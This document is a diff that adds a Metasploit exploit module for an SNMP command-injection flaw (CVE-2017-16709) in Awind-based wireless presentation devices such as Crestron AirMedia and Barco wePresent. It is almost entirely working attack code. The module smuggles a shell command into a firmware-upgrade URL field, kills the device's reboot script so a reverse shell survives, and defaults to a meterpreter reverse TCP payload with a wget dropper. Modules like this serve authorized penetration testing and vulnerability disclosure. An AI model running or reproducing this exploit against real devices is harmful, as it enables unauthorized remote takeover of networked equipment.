@@ -1,0 +1,181 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::SNMPClient
+  include Msf::Exploit::CmdStager
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "AwindInc SNMP Service Command Injection",
+      'Description'    => %q{
+        This module exploits a vulnerability found in AwindInc and OEM'ed products where untrusted inputs are fed to ftpfw.sh system command, leading to command injection.
+        A valid SNMP read-write community is required to exploit this vulnerability.
+
+        The following devices are known to be affected by this issue:
+
+          * Crestron Airmedia AM-100 <= version 1.5.0.4
+          * Crestron Airmedia AM-101 <= version 2.5.0.12
+          * Awind WiPG-1600w <= version 2.0.1.8
+          * Awind WiPG-2000d <= version 2.1.6.2
+          * Barco wePresent 2000 <= version 2.1.5.7
+          * Newline Trucast 2 <= version 2.1.0.5
+          * Newline Trucast 3 <= version 2.1.3.7
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Quentin Kaiser <kaiserquentin[at]gmail.com>'
+        ],
+      'References'     =>
+        [
+          ['CVE', '2017-16709'],
+          ['URL', 'https://github.com/QKaiser/awind-research'],
+          ['URL', 'https://qkaiser.github.io/pentesting/2019/03/27/awind-device-vrd/']
+        ],
+      'DisclosureDate' => '2019-03-27',
+      'Platform'       => ['unix', 'linux'],
+      'Arch'           => [ARCH_CMD, ARCH_ARMLE],
+      'Privileged'     => true,
+      'Targets'        => [
+        ['Unix In-Memory',
+          'Platform'    => 'unix',
+          'Arch'        => ARCH_CMD,
+          'Type'        => :unix_memory,
+          'Payload'     => {
+            'Compat'    => {'PayloadType' => 'cmd', 'RequiredCmd' => 'openssl'}
+          }
+        ],
+        ['Linux Dropper',
+          'Platform'    => 'linux',
+          'Arch'        => ARCH_ARMLE,
+          'CmdStagerFlavor' => %w[wget],
+          'Type'        => :linux_dropper
+        ]
+      ],
+      'DefaultTarget'  => 1,
+      'DefaultOptions' => {'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp'}))
+
+    register_options(
+      [
+        OptString.new('COMMUNITY', [true, 'SNMP Community String', 'private']),
+      ])
+  end
+
+
+  def check
+    begin
+      connect_snmp
+      sys_description = snmp.get_value('1.3.6.1.2.1.1.1.0').to_s
+      print_status("Target system is #{sys_description}")
+      # AM-100 and AM-101 considered EOL, no fix so no need to check version.
+      model = sys_description.scan(/Crestron Electronics (AM-100|AM-101)/).flatten.first
+      case model
+      when 'AM-100', 'AM-101'
+          return CheckCode::Vulnerable
+      else
+          # TODO: insert description check for other vulnerable models (that I don't have)
+          # In the meantime, we return 'safe'.
+          return CheckCode::Safe
+      end
+    rescue SNMP::RequestTimeout
+      print_error("#{ip} SNMP request timeout.")
+    rescue Rex::ConnectionError
+      print_error("#{ip} Connection refused.")
+    rescue SNMP::UnsupportedVersion
+      print_error("#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.")
+    rescue ::Interrupt
+      raise $!
+    rescue ::Exception => e
+      print_error("Unknown error: #{e.class} #{e}")
+    ensure
+      disconnect_snmp
+    end
+    Exploit::CheckCode::Unknown
+  end
+
+  def inject_payload(cmd)
+    begin
+      connect_snmp
+      varbind = SNMP::VarBind.new([1,3,6,1,4,1,3212,100,3,2,9,1,0],SNMP::OctetString.new(cmd))
+      resp = snmp.set(varbind)
+      if resp.error_status == :noError
+        print_status("Injection successful")
+      else
+        print_status("OID not writable or does not provide WRITE access with community '#{datastore['COMMUNITY']}'")
+      end
+    rescue SNMP::RequestTimeout
+      print_error("#{ip} SNMP request timeout.")
+    rescue Rex::ConnectionError
+      print_error("#{ip} Connection refused.")
+    rescue SNMP::UnsupportedVersion
+      print_error("#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.")
+    rescue ::Interrupt
+      raise $!
+    rescue ::Exception => e
+      print_error("Unknown error: #{e.class} #{e}")
+    ensure
+      disconnect_snmp
+    end
+  end
+
+  def trigger
+    begin
+      connect_snmp
+      varbind = SNMP::VarBind.new([1,3,6,1,4,1,3212,100,3,2,9,5,0],SNMP::Integer32.new(1))
+      resp = snmp.set(varbind)
+      if resp.error_status == :noError
+        print_status("Trigger successful")
+      else
+        print_status("OID not writable or does not provide WRITE access with community '#{datastore['COMMUNITY']}'")
+      end
+    rescue SNMP::RequestTimeout
+      print_error("#{ip} SNMP request timeout.")
+    rescue Rex::ConnectionError
+      print_error("#{ip} Connection refused.")
+    rescue SNMP::UnsupportedVersion
+      print_error("#{ip} Unsupported SNMP version specified. Select from '1' or '2c'.")
+    rescue ::Interrupt
+      raise $!
+    rescue ::Exception => e
+      print_error("Unknown error: #{e.class} #{e}")
+    ensure
+      disconnect_snmp
+    end
+  end
+
+  def exploit
+    case target['Type']
+    when :unix_memory
+      execute_command(payload.encoded)
+    when :linux_dropper
+      execute_cmdstager
+    end
+  end
+
+  def execute_command(cmd, opts = {})
+    # The payload must start with a valid FTP URI otherwise the injection point is not reached
+    cmd = "ftp://1.1.1.1/$(#{cmd.to_s})"
+
+    # When the FTP download fails, the script calls /etc/reboot.sh and we loose the callback
+    # We therefore kill /etc/reboot.sh before it reaches /sbin/reboot with that command and
+    # keep our reverse shell opened :)
+    cmd << "$(pkill -f /etc/reboot.sh)"
+
+    # the MIB states that camFWUpgradeFTPURL must be 255 bytes long so we pad
+    cmd << "A" * (255-cmd.length)
+
+    # we inject our payload in camFWUpgradeFTPURL
+    print_status("Injecting payload")
+    inject_payload(cmd)
+
+    # we trigger the firmware download via FTP, which will end up calling this
+    # "/bin/getRemoteURL.sh %s %s %s %d"
+    print_status("Triggering call")
+    trigger
+  end
+end
